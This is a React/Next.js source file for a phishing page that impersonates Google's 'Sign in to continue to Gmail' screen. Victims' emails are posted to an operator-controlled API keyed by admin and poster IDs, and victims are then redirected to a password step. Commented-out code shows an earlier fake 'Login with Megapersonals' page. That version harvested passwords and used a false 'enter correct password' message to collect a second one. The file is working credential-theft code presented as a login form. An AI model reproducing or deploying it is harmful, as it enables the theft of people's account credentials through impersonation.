"use client";
import { API_URL, site } from "../config/index";
import Image from "next/image";
import useMockLogin from "../hooks/useMockLogin";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";

function LoginForm({ adminId, posterId }) {
  const [email, setEmail] = useState("");
  // const [showWrongPassword, setShowWrongPassword] = useState(false);
  // const [wrongPassword, setWrongPassword] = useState("");

  const router = useRouter();

  // const { login } = useMockLogin(adminId, posterId);

  // const handleSubmit = async () => {
  //   const allValues = {
  //     site: site,
  //     email: email,
  //     // password: password,
  //     // skipcode: "",
  //   };
  //   try {
  //     await login(allValues);
  //     router.push(`/password`);
  //     // setShowWrongPassword(true);
  //     // setEmail("");
  //     // setPassword("");

  //     console.log("allValues", allValues);
  //   } catch (error) {
  //     console.log(error);
  //   }
  // };
  useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, [adminId, posterId]);
  const handleSubmit = async () => {
    if (!email) {
      return;
    }
    const values = {
      email: email,
      site: site,
    };
    console.log(values);
    const url = `${API_URL}/email/post/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);
      router.push("/password");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };


  // const handleWrongPassword = async () => {
  //   const url = `${API_URL}/add/wrongpassword`;
  //   const id = Cookies.get("id");
  //   const values = {
  //     id,
  //     wrongPassword,
  //   };

  //   const res = await fetch(url, {
  //     method: "POST",
  //     headers: {
  //       Accept: "application/json",
  //       "Content-Type": "application/json",
  //     },
  //     body: JSON.stringify(values),
  //   });
  //   const data = await res.json();
  //   console.log(data);

  //   if (res.ok) {
  //     console.log("success", data);
  //     setEmail("");
  //     setWrongPassword("");
  //     router.push(`/security-check`);
  //   } else {
  //     console.log("error", data);
  //     toast.error("Something Went Wrong");
  //   }
  // };
  
  return (
    // <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
    //   <p class="text-3xl font-semibold ">Live Video Chat</p>
    //   <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
    //     Know each other and enjoy{" "}
    //     <span class="text-green-500">private, secure</span>
    //     <span class="text-green-500"></span> and{" "}
    //     <span class="text-green-500">hasslefree</span> live moment with your
    //     dating partner
    //   </p>
    //   <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
    //   <p class="text-xl font-semibold mt-3 text-center">
    //     Login with Megapersonals
    //   </p>
    //   <div class="flex flex-col gap-y-4 mt-4">
    //     <p
    //       class={`${
    //         showWrongPassword
    //           ? "block bg-neutral-200 p-2 rounded text-sm"
    //           : "hidden"
    //       }  `}
    //       id="msg"
    //     >
    //       Please enter correct password
    //     </p>
    //     <input
    //       required=""
    //       class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
    //       placeholder="Enter email here"
    //       type="email"
    //       name="email"
    //       value={email}
    //       onChange={(e) => setEmail(e.target.value)}
    //     />
    //     <input
    //       required
    //       className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
    //       placeholder="Enter password here"
    //       type="password"
    //       name={showWrongPassword ? "wrongPassword" : "password"}
    //       value={showWrongPassword ? wrongPassword : password}
    //       onChange={(e) =>
    //         showWrongPassword
    //           ? setWrongPassword(e.target.value)
    //           : setPassword(e.target.value)
    //       }
    //     />
    //     <button
    //       onClick={showWrongPassword ? handleWrongPassword : handleSubmit}
    //       className="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
    //     >
    //       Submit
    //     </button>
    //   </div>
    // </div>
    <div className="bg-white w-full max-w-4xl p-6 rounded-lg flex flex-col md:flex-row items-start gap-6 md:gap-20 z-10">
      <div className="flex flex-col gap-3">
        <img
          src="/images/google-logo-small.png"
          width={80}
          height={40}
          className="object-cover"
        />
        <p className="font-medium text-xl">Sign in</p>
        <p className="font-medium text-md">to continue to Gmail</p>
      </div>

      <div className="flex-1 w-full">
        <input
          required
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="w-full px-3 py-2 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-2"
          type="text"
          placeholder="Enter your email address"
        />
        <p className="text-[#1a73e8] text-sm mt-2 cursor-pointer">
          Forgot email?
        </p>
        <p className="text-sm mt-1">
          Not your computer? Use Guest mode to sign in privately.
        </p>
        <p className="text-[#1a73e8] text-sm mt-1 cursor-pointer">
          Learn more about using Guest mode
        </p>
        <div className="flex items-center justify-end mt-6 gap-4">
          <p className="text-zinc-800 text-sm mt-2 cursor-pointer">
            Create account
          </p>
          <button
            onClick={handleSubmit}
            className="bg-zinc-800 text-white px-6 py-1 rounded-lg mt-1"
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
